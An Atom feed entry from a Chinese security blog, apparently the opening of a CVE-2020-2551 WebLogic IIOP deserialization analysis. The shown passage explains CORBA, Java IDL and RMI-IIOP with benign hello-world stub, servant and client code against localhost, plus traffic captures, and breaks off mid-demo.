<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Passer6y&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://0day.design/"/>
  <updated>2020-03-19T08:13:51.080Z</updated>
  <id>http://0day.design/</id>
  
  <author>
    <name>Passer6y</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Weblogic IIOP反序列化漏洞分析(CVE-2020-2551)</title>
    <link href="http://0day.design/2020/03/19/Weblogic%20IIOP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://0day.design/2020/03/19/Weblogic IIOP反序列化漏洞分析/</id>
    <published>2020-03-19T02:44:00.000Z</published>
    <updated>2020-03-19T08:13:51.080Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>CVE-2020-2551: Weblogic IIOP反序列化漏洞分析</p><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="IDL与Java-IDL"><a href="#IDL与Java-IDL" class="headerlink" title="IDL与Java IDL"></a>IDL与Java IDL</h2><p><strong>IDL</strong>（Interface Definition Language）接口定义语言，它主要用于描述软件组件的应用程序编程接口的一种规范语言。它完成了与各种编程语言无关的方式描述接口，从而实现了不同语言之间的通信，这样就保证了跨语言跨环境的远程对象调用。</p><p><strong>JAVA IDL</strong>是一个分布的对象技术，允许其对象在不同的语言间进行交互。它的实现是基于公共对象代理体系(Common Object Request Brokerage Architecture,CORBA)，一个行业标准的分布式对象模型。每个语言支持CORBA都有他们自己的IDL Mapping映射关系，IDL和JAVA的映射关系可以参考文档<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/idl/mapping/jidlMapping.html" target="_blank" rel="noopener">Java IDL: IDL to Java Language Mapping</a></p><blockquote><p>在jdk安装后，会附带有<code>idlj</code>编译器，使用<code>idlj</code>命令可以将IDL文件编译成java文件</p></blockquote><h2 id="COBAR"><a href="#COBAR" class="headerlink" title="COBAR"></a>COBAR</h2><p>CORBA(Common ObjectRequest Broker Architecture)公共对象请求代理体系结构，是由OMG组织制订的一种标准分布式对象结构。其提出是为了解决不同应用间的通信，曾是分布式计算的主流技术。</p><p>CORBA结构分为三部分：</p><ul><li>naming service</li><li>client side </li><li>servant side</li></ul><p>他们之间的关系简单理解为：client side从naming service中获取服务方servant side信息。servant side需要在naming service中注册，这样client side在要访问具体内容时会先去naming service查找，以找到对应的servant side服务。</p><blockquote><p>可以理解为目录与章节具体内容具体关系：naming service目录，servant side为内容，目的就是为了让client side快速从目录找到内容。</p></blockquote><h3 id="CORBA通信过程"><a href="#CORBA通信过程" class="headerlink" title="CORBA通信过程"></a>CORBA通信过程</h3><p>在CORBA客户端和服务器之间进行远程调用模型如下：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051057378.jpg" alt=""></p><p>在客户端，应用程序包含远程对象的引用，对象引用具有存根(stub)方法，存根方法是远程调用该方法的替身。存根实际上是连接到<strong>ORB</strong>(Object Request Broker)对象请求代理的，因此调用它会调用ORB的连接功能，该功能会将调用转发到服务器。</p><p>在服务器端，ORB使用框架代码将远程调用转换为对本地对象的方法调用。框架将调用和任何参数转换为其特定于实现的格式，并调用客户端想要调用的方法。方法返回时，框架代码将转换结果或错误，然后通过ORB将其发送回客户端。</p><p>在ORB之间，通信通过<strong>IIOP</strong>(the Internet Inter-ORB Protocol)互联网内部对象请求代理协议进行。基于标准TCP/IP Internet协议的IIOP提供了CORBA客户端和服务端之间通信的标准。</p><h3 id="使用JAVA-IDL编写CORBA分布式应用"><a href="#使用JAVA-IDL编写CORBA分布式应用" class="headerlink" title="使用JAVA IDL编写CORBA分布式应用"></a>使用JAVA IDL编写CORBA分布式应用</h3><h4 id="编写IDL"><a href="#编写IDL" class="headerlink" title="编写IDL"></a>编写IDL</h4><p>CORBA使用IDL供用户描述程序接口， 所以这里第一步就是编写idl描述接口，创建<code>Hello.idl</code>文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">module HelloApp</span><br><span class="line">&#123;</span><br><span class="line">interface Hello</span><br><span class="line">&#123;</span><br><span class="line">string sayHello();</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>该段代码描述了<code>Hello</code>接口中包含<code>sayHello()</code>方法，他会返回字符串类型数据。</p><h4 id="编译生成client-side-classes"><a href="#编译生成client-side-classes" class="headerlink" title="编译生成client side classes"></a>编译生成client side classes</h4><p>接着使用JAVA的IDL编译器<code>idlj</code>，将idl文件编译成class文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idlj -fclient Hello.idl</span><br></pre></td></tr></table></figure></p><p>创建了一个新目录<code>HelloApp</code>，并生成了5个新文件：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631851.jpg" alt="-w1067"></p><p>他们之间的关系如下图所示：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631861.jpg" alt=""></p><blockquote><p>图片来源：<a href="https://weinan.io/2017/05/03/corba-iiop.html" target="_blank" rel="noopener">An Introduction To The CORBA And Java RMI-IIOP</a></p></blockquote><p>参考代码，简单概括一下:</p><ul><li><code>HelloOperations</code>接口中定义<code>sayHello()</code>方法</li><li><code>Hello</code>继承了<code>HelloOperations</code></li><li><code>_HelloStub</code>类实现了<code>Hello</code>接口，client side使用<code>hello</code>接口调用<code>servant side</code>。</li><li><code>HelloHelper</code>类实现网络传输，数据编码和解码的工作。</li></ul><p>详细分析一下几段核心代码，先来看一下<code>_HelloStub.java</code>中<code>sayHello()</code>的实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public String sayHello ()</span><br><span class="line">&#123;</span><br><span class="line">          org.omg.CORBA.portable.InputStream $in = null;</span><br><span class="line">          try &#123;</span><br><span class="line">              org.omg.CORBA.portable.OutputStream $out = _request (&quot;sayHello&quot;, true);</span><br><span class="line">              $in = _invoke ($out);</span><br><span class="line">              String $result = $in.read_string ();</span><br><span class="line">              return $result;</span><br><span class="line">          &#125; catch (org.omg.CORBA.portable.ApplicationException $ex) &#123;</span><br><span class="line">              $in = $ex.getInputStream ();</span><br><span class="line">              String _id = $ex.getId ();</span><br><span class="line">              throw new org.omg.CORBA.MARSHAL (_id);</span><br><span class="line">          &#125; catch (org.omg.CORBA.portable.RemarshalException $rm) &#123;</span><br><span class="line">              return sayHello (        );</span><br><span class="line">          &#125; finally &#123;</span><br><span class="line">              _releaseReply ($in);</span><br><span class="line">          &#125;</span><br><span class="line">&#125; // sayHello</span><br></pre></td></tr></table></figure></p><p>使用<code>org.omg.CORBA.portable</code>的<code>InputStream</code>和<code>OutputStream</code>来表示调用的请求和响应，通过<code>_request()</code>和<code>_invoke()</code>方法调用得到结果。</p><p>另外在<code>HelloHelper</code>类中负责处理对象网络传输的编码和解码，来看一下<code>narrow</code>方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> HelloApp.<span class="function">Hello <span class="title">narrow</span> <span class="params">(org.omg.CORBA.Object obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (obj == <span class="keyword">null</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> HelloApp.Hello)</span><br><span class="line">    <span class="keyword">return</span> (HelloApp.Hello)obj;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!obj._is_a (id ()))</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> org.omg.CORBA.BAD_PARAM ();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    org.omg.CORBA.portable.Delegate delegate = ((org.omg.CORBA.portable.ObjectImpl)obj)._get_delegate ();</span><br><span class="line">    HelloApp._HelloStub stub = <span class="keyword">new</span> HelloApp._HelloStub ();</span><br><span class="line">    stub._set_delegate(delegate);</span><br><span class="line">    <span class="keyword">return</span> stub;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>接受一个<code>org.omg.CORBA.Object</code>对象作为参数，返回stub。</p><h4 id="编译生成servant-side"><a href="#编译生成servant-side" class="headerlink" title="编译生成servant side"></a>编译生成servant side</h4><p>执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idlj -fserver Hello.idl</span><br></pre></td></tr></table></figure></p><p>会生成三个文件，除了<code>HelloPOA.java</code>,其余都是一样的。<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631868.jpg" alt="-w263"></p><p>POA(Portable Object Adapter)是便携式对象适配器，它是CORBA规范的一部分。这里的这个POA虚类是servant side的框架类，它提供了方法帮助我们将具体实现对象注册到naming service上。</p><p>来看一下其核心代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloPOA</span> <span class="keyword">extends</span> <span class="title">org</span>.<span class="title">omg</span>.<span class="title">PortableServer</span>.<span class="title">Servant</span></span></span><br><span class="line"><span class="class"> <span class="keyword">implements</span> <span class="title">HelloApp</span>.<span class="title">HelloOperations</span>, <span class="title">org</span>.<span class="title">omg</span>.<span class="title">CORBA</span>.<span class="title">portable</span>.<span class="title">InvokeHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Constructors</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> java.util.Hashtable _methods = <span class="keyword">new</span> java.util.Hashtable ();</span><br><span class="line">  <span class="keyword">static</span></span><br><span class="line">  &#123;</span><br><span class="line">    _methods.put (<span class="string">"sayHello"</span>, <span class="keyword">new</span> java.lang.Integer (<span class="number">0</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> org.omg.CORBA.portable.<span class="function">OutputStream <span class="title">_invoke</span> <span class="params">(String $method,</span></span></span><br><span class="line"><span class="function"><span class="params">                                org.omg.CORBA.portable.InputStream in,</span></span></span><br><span class="line"><span class="function"><span class="params">                                org.omg.CORBA.portable.ResponseHandler $rh)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    org.omg.CORBA.portable.OutputStream out = <span class="keyword">null</span>;</span><br><span class="line">    java.lang.Integer __method = (java.lang.Integer)_methods.get ($method);</span><br><span class="line">    <span class="keyword">if</span> (__method == <span class="keyword">null</span>)</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> org.omg.CORBA.BAD_OPERATION (<span class="number">0</span>, org.omg.CORBA.CompletionStatus.COMPLETED_MAYBE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (__method.intValue ())</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">case</span> <span class="number">0</span>:  <span class="comment">// HelloApp/Hello/sayHello</span></span><br><span class="line">       &#123;</span><br><span class="line">         String $result = <span class="keyword">null</span>;</span><br><span class="line">         $result = <span class="keyword">this</span>.sayHello ();</span><br><span class="line">         out = $rh.createReply();</span><br><span class="line">         out.write_string ($result);</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">default</span>:</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> org.omg.CORBA.BAD_OPERATION (<span class="number">0</span>, org.omg.CORBA.CompletionStatus.COMPLETED_MAYBE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out;</span><br><span class="line">  &#125; <span class="comment">// _invoke</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></p><p>值得注意的是他也实现了<code>HelloOperations</code>接口，代码的最开始将<code>sayHello</code>方法放入一个hashtable中，<code>_invoke</code>方法中，将调用<code>sayHello()</code>的结果通过<code>org.omg.CORBA.portable.ResponseHandler</code>对象通过网络传输到client side。</p><p>此时<code>idjl</code>生成的全部class的关系图：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631880.jpg" alt=""></p><p>接下来，要做的就是用户自己实现client side和servant side中具体的方法操作。</p><h4 id="servant-side实现"><a href="#servant-side实现" class="headerlink" title="servant side实现"></a>servant side实现</h4><p>对于servant side而言，实现一个<code>HelloImpl</code>类来继承<code>HelloPOA</code>类实现<code>sayHello()</code>方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> HelloApp;</span><br><span class="line"><span class="keyword">import</span> org.omg.CORBA.ORB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">extends</span> <span class="title">HelloPOA</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ORB orb;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setORB</span><span class="params">(ORB orbVal)</span> </span>&#123;</span><br><span class="line">        orb = orbVal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"\nHello, world!\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此时的继承关系如下：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631890.jpg" alt=""></p><p>接着，需要写一个服务端<code>HelloServer</code>类来接受client side对<code>HelloImpl.sayHello()</code>的调用。</p><p>三个部分：</p><ul><li>第一部分根据传入的<code>name service</code>地址参数来创建，根据CORBA的规范，通过ORB获取一个名称为<code>RootPOA</code>的<code>POA</code>对象。(其中name service由jdk中的<code>orbd</code>提供)</li><li>第二部分就是将具体实现类注册到naming service中，用orb获取到name service，将<code>HelloImpl</code>对象以<code>Hello</code>为名绑定。</li><li>第三部分就是将server设置为监听状态持续运行，用于拦截并处理client side的请求，返回相应的具体实现类。</li></ul><p><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631898.jpg" alt="-w712"></p><h4 id="Client-Side实现"><a href="#Client-Side实现" class="headerlink" title="Client Side实现"></a>Client Side实现</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> HelloApp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.omg.CORBA.ORB;</span><br><span class="line"><span class="keyword">import</span> org.omg.CosNaming.NamingContext;</span><br><span class="line"><span class="keyword">import</span> org.omg.CosNaming.NamingContextExt;</span><br><span class="line"><span class="keyword">import</span> org.omg.CosNaming.NamingContextExtHelper;</span><br><span class="line"><span class="keyword">import</span> org.omg.CosNaming.NamingContextHelper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> Hello helloImpl;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        ORB orb = ORB.init(args, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        org.omg.CORBA.Object objRef = orb.resolve_initial_references(<span class="string">"NameService"</span>);</span><br><span class="line"></span><br><span class="line">        NamingContextExt ncRef = NamingContextExtHelper.narrow(objRef);</span><br><span class="line"></span><br><span class="line">        String name = <span class="string">"Hello"</span>;</span><br><span class="line">        <span class="comment">// helloImpl的类型为_HelloStub，而不是真正的helloImpl</span></span><br><span class="line">        helloImpl = HelloHelper.narrow(ncRef.resolve_str(name));</span><br><span class="line"></span><br><span class="line">        System.out.println(helloImpl.sayHello());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先和服务端一样，需要初始化ORB，通过ORB来获取NameService并将其转换成命名上下文。之后通过别名在命名上下文中获取其对应的Stub，调用Stub中的sayhello()方法，这个时候才会完成client side向servant side发送请求，POA处理请求，并将具体实现的HelloImpl包装返回给client side。</p><h4 id="naming-service实现"><a href="#naming-service实现" class="headerlink" title="naming service实现"></a>naming service实现</h4><p>ORBD可以理解为ORB的守护进程(daemon)，其主要负责建立客户端(client side)与服务端(servant side)的关系，同时负责查找指定的IOR(可互操作对象引用，是一种数据结构，是CORBA标准的一部分)。ORBD是由Java原生支持的一个服务，其在整个CORBA通信中充当着naming service的作用，可以通过一行命令进行启动：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orbd -ORBInitialPort 1050 -ORBInitialHost 127.0.0.1</span><br></pre></td></tr></table></figure></p><h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><p>接着分别在<code>HelloServer</code>和<code>HelloClient</code>配置name service地址：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631905.jpg" alt="-w1007"></p><p>其次依次启动<code>name service</code>、<code>HelloServer</code>、<code>HelloClient</code>结果如上图所示。</p><p>此外，除了上述先获取NameServer，后通过<code>resolve_str()</code>方法生成(NameServer方式)的stub，还有两种：</p><ul><li>使用ORB.string_to_object生成（ORB生成方式）</li><li>使用javax.naming.InitialContext.lookup()生成（JNDI生成方式）</li></ul><p>代码分别如下:<br>orb方式<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClietORB</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> Hello helloImpl;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ORB orb = ORB.init(args, <span class="keyword">null</span>);</span><br><span class="line">        org.omg.CORBA.Object obj = orb.string_to_object(<span class="string">"corbaname::127.0.0.1:1050#Hello"</span>);</span><br><span class="line">        Hello hello = HelloHelper.narrow(obj);</span><br><span class="line">        System.out.println(hello.sayHello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631913.jpg" alt="-w1164"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClientORB2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> Hello helloImpl;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        ORB orb = ORB.init(args, <span class="keyword">null</span>);</span><br><span class="line">        org.omg.CORBA.Object obj = orb.string_to_object(<span class="string">"corbaloc::127.0.0.1:1050"</span>);</span><br><span class="line">        NamingContextExt ncRef = NamingContextExtHelper.narrow(obj);</span><br><span class="line">        Hello hello = HelloHelper.narrow(ncRef.resolve_str(<span class="string">"Hello"</span>));</span><br><span class="line">        System.out.println(hello.sayHello());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631922.jpg" alt="-w1151"></p><p>JDNI方式：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClientJNDI</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> Hello helloImpl;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ORB orb = ORB.init(args, <span class="keyword">null</span>);</span><br><span class="line">        Hashtable env = <span class="keyword">new</span> Hashtable(<span class="number">5</span>, <span class="number">0.75f</span>);</span><br><span class="line">        env.put(<span class="string">"java.naming.corba.orb"</span>, orb);</span><br><span class="line">        Context ic = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        Hello helloRef = HelloHelper.narrow((org.omg.CORBA.Object)ic.lookup(<span class="string">"corbaname::127.0.0.1:1050#Hello"</span>));</span><br><span class="line">        System.out.println(helloRef.sayHello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631933.jpg" alt="-w1510"></p><h3 id="CORBA网络流量分析"><a href="#CORBA网络流量分析" class="headerlink" title="CORBA网络流量分析"></a>CORBA网络流量分析</h3><h4 id="servant-side"><a href="#servant-side" class="headerlink" title="servant side"></a>servant side</h4><p>服务端流量大致分为两个部分：</p><ul><li>获取Naming Service</li><li>注册servant side</li></ul><p>获取Naming Service的流量如下：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631941.jpg" alt="-w1584"><br>在返回的响应中，拿到了<code>RootPOA</code>：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631952.jpg" alt="-w824"><br>对应的代码为：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631959.jpg" alt="-w1136"></p><p>接着检测获取到的<code>NamingService</code>对象是否为<code>NamingContextExt</code>类的示例：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631968.jpg" alt="-w1234"><br>对应代码：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631975.jpg" alt="-w1099"><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631984.jpg" alt="-w1144"></p><p>最后发送<code>op=to_name</code>和<code>op=rebind</code>两个指令：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631992.jpg" alt="-w1522"><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631998.jpg" alt="-w778"><br>分别为设置引用名，和设置绑定信息，来看一下<code>op=rebind</code>的数据包：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632008.jpg" alt="-w1280"><br>这里通过IOR信息表示了servant side的相关rpc信息。</p><h4 id="client-side"><a href="#client-side" class="headerlink" title="client side"></a>client side</h4><p>这里以NameServer方式生成stub为例：</p><ul><li>获取nameservice、<code>op=_is_a</code>判断</li><li>根据引用名获取servant side的接口Stub</li><li>发送方法名，调用远程方法，得到结果<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632018.jpg" alt="-w1663"><br>分别对应代码步骤：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632026.jpg" alt="-w1132"></li></ul><h2 id="RMI-IIOP"><a href="#RMI-IIOP" class="headerlink" title="RMI-IIOP"></a>RMI-IIOP</h2><p>RMI-IIOP出现以前，只有RMI和CORBA两种选择来进行分布式程序设计，二者之间不能协作。RMI-IIOP综合了RMI和CORBA的优点，克服了他们的缺点，使得程序员能更方便的编写分布式程序设计，实现分布式计算。<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632034.jpg" alt="-w925"></p><h3 id="Demo-RMI-IIOP远程调用"><a href="#Demo-RMI-IIOP远程调用" class="headerlink" title="Demo: RMI-IIOP远程调用"></a>Demo: RMI-IIOP远程调用</h3><p>参考文档<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/rmi-iiop/tutorial.html#7738" target="_blank" rel="noopener">Tutorial: Getting Started Using RMI-IIOP</a>所述，一共四个步骤，对应的文件如下：</p><ul><li>定义远程接口类：HelloInterface.java</li><li>编写实现类：HelloImpl.java, 实现接口HelloInterface</li><li>编写服务端类：HelloServer.java, RMI服务端实例远程类，将其绑定到name service中</li><li>编写客户端类：HelloClient.java, 调用远程方法<code>sayHello()</code></li></ul><p>实现接口类，必须要实现Remote远程类，且抛出<code>java.rmi.RemoteException</code>异常。<br>HelloInterface.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloInterface</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">( String from )</span> <span class="keyword">throws</span> java.rmi.RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>实现接口类，必须写构造方法调用父类构造方法，给远程对象初始化使用，同时要实现一个方法给远程调用使用(<code>sayHello()</code>)<br>HelloImpl.java<br><figure class="highlight java"><table><tr><td 